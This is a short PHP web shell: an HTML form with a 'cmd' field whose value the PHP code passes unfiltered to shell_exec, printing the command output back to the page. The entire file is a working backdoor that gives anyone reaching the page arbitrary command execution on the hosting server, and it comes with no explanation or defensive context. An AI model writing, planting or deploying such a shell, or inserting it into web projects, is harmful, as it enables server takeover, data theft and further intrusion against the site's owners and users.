<form action="#" method="get">
 <p>Cmd : <input type="text" name="cmd" /><input type="submit" value="OK"></p>
</form>
<?php
echo"<pre>";
echo(shell_exec($_GET['cmd']));
echo"</pre>";
?>